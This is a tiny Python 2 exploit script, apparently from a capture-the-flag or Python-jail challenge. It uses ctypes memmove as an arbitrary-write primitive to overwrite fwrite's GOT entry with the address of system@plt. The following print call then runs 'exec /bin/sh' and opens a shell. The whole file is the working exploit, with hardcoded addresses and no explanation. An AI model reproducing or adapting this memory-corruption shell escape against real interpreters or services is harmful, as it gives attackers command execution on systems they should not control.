#!/usr/bin/python
from ctypes import *
addr = 0x416950  # system@plt
awrite = 0x8eb810  # fwrite@got
# arbiread = string_at
# arbiwrite = memmove
memmove(awrite, (('%016x' % addr).decode('hex')[::-1]), 8)
print "exec /bin/sh"
